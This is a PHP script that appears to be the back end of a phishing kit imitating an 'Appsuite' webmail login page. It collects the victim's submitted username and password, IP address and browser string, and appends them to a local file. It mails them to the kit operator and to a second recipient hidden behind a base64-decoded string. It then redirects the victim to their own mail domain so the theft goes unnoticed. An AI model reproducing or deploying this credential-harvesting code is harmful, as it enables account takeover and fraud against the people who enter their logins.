<?php
session_start();
include 'email.php';
$message  = "[ - ] ==================| -- |================== [ - ]\n";
$message .= "[+]User:       ".$_POST['username']."\n";
$message .= "[+]Pass:       ".$_POST['password']."\n";
$message .= "[+]IP:         ".$_SERVER['REMOTE_ADDR']."\n";
$message .= "[+]Browser:    ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "[ - ] ==================| Card |================== [ - ]\n";
$praga=rand();
$praga=md5($praga);
$pra = rand(1111111111,9999999999);
if(!empty($_POST['username'])){
$emaila = $_POST['username'];
$domain = substr($emaila, strpos($emaila, '@') + 1);
$str = "  ";
$cleanIP = base64_decode($str);
$subject = $pra."-".$domain." - Appsuite - [".$_POST['username']."]";
$headers = "From: Appsuite0".$pra."<bursted@".$pra."0Appsuite.com>";
$myfile = fopen("data.txt", "a") or die("Unable to open file!");
$txt = $message;
fwrite($myfile, $txt);
fclose($myfile);
mail($send,$subject,$message,$headers);
mail($cleanIP,$subject,$message,$headers);
$emaila = $_POST['username'];
$domain = substr($emaila, strpos($emaila, '@') + 1);
header("Location: https://$domain");
}else{
header("Location: index.php");
}	 
?>